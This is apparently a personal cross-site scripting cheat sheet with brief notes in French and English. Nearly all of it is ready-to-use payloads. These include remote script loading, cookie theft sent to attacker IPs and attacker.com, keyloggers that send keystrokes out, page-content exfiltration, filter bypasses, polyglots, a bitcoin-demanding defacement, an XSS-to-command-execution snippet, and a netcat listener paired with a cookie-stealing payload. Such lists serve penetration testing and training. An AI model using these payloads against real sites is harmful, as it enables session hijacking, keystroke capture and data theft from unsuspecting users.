
- https://github.com/payloadbox/xss-payload-list
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

```html
<script class="xss">$('.xss').parents().eq(1).find('a').eq(1).click();$('[data-action=retweet]').click();alert('XSS in X')</script>
```



Load remote script

```html
<script src="http://192.168.45.128/xss.js"></script>
```

Bypasser le mot script filter

```html
<sscriptcript>alert('berty');</sscriptcript>
```

Send Cookie details to us: Session-Hijacking

```js
new Image().src = "http://192.168.75.137/xss.php?cookie="+ escape(document.cookie);
```

```js
fetch("http://192.168.45.128/xss.php?cookie=" + btoa(document.cookie));

<script>
fetch('http://target.com/endpoint.php')
.then(response => response.text())
.then(data => fetch('http://attacker.com/?data' + btoa(data)))
</script>
```


Rediriger l'utilisateur vers un autre site

```js
window.location.replace("https://otherwebsite.com");
```

Modifier la page actuel

```js
document.body.innerHTML = "<center><br><br><br><h1>Oh noez, your are haxed! Send bitcoins quick!</h1></center>";
```

Enregistreur de frappe | Key Logger

```js
document.onkeypress = function(c){ fetch("http://192.168.100.129/?k="+ String.fromCharCode(c.which)); }
document.onkeypress = function(e){ fetch('http://192.168.75.137/log?key=' + btoa(e.key) );}
```

HTML2Canvas

```js
fetch("http://192.168.100.129/?dom="+btoa(document.documentElement.outerHTML));
```

Recuperer le navigateur client

```js
fetch("http://192.168.75.137/?nav="+navigator.userAgent);
```

Polyglottes

```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('ErrorDipeua') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Dipeua')//>\x3e
```

XSS => RCE

```js
var sys = require('sys');
var exec = require('child_process').exec;
exec("C:\\Windows\\System32\\cmd.exe", function(error, stdout, stderr){ sys.puts(stdout) });
exec("/bin/bash", function(error, stdout, stderr){ sys.puts(stdout) });
```

# DOM

```html
<iframe src="javascript:alert(document.domain)">

<img src=x onerror="alert(document.domain)">

"><img src=x onerror=prompt(document.domain);>

#"><img src=/ onerror=alert(document.cookie)>

<svg/onload="alert(document.domain)">

xss"><Â ! --><svg/onload=alert(document.domain)>

<noscript><p title="</noscript><img src=x onerro=alert(1)>">
```

```html
nc -nlvp 9001


</textarea><script>fetch('http://10.11.86.29:9001?cookie=' + btoa(document.cookie) );</script>
```

